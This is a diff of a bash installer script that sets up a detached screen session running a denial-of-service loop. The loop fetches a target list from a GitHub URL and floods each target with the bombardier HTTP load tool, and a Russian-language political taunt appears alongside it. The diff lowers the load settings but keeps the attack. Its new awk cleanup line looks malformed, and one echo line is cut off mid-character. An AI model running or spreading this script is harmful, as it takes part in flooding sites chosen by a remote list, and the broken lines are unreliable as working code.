@@ -624,7 +624,8 @@ do_install() {
 
 if command_exists screen; then
 	echo "Screen exists"
-	killall -q -9 screen || true
+	screen -ls | grep '(Detached)' | awk 'sys {screen -S $1 -X quit}'
+	screen -wipe
 else
 	apt-get -y install screen
 fi
@@ -641,11 +642,12 @@ echo "Русский корабль, иди нахуй! Можно отсоед�
 screen -dm bash -c '
 while true
 do
-	curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list > /tmp/list
-	while read p; do
+	readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
+	for p in "${list[@]}"
+	do
 	  echo "$p"
-	  docker run alpine/bombardier -c 1000 -d 60s -l "$p" 2 > /dev/null;
+	  docker run -it alpine/bombardier -c 1 -d 2s -l "$p"
 	  sleep 1;
-	done < /tmp/list
+	done
 done
 '
